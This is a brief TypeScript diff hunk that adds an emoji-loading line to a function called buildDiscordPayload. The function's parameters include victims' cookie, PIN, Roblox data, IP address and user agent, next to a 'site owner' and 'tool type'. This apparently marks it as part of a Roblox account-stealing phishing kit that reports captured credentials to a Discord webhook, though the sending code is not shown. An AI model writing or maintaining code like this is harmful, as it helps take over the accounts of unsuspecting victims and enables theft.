@@ -665,6 +665,7 @@ function buildDiscordPayload(opts: {
   extras?: Record<string, string | number | undefined>;
 }) {
   const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;
+  const EMOJI = loadEmoji();
 
   const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
     { name: `${EMOJI.owner} Site Owner`, value: ownerUsername, inline: true },
